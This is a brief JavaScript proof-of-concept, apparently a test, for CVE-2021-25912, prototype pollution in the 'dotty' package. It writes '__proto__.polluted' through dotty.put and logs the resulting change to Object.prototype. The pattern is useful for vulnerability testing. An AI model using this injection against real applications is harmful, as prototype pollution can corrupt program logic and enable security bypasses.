// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25912
// test("prototype pollution in dotty", () => {
console.log({}.polluted);

  const dotty = require("dotty");
  dotty.put({}, "__proto__.polluted", "yes");

console.log({}.polluted);
// });
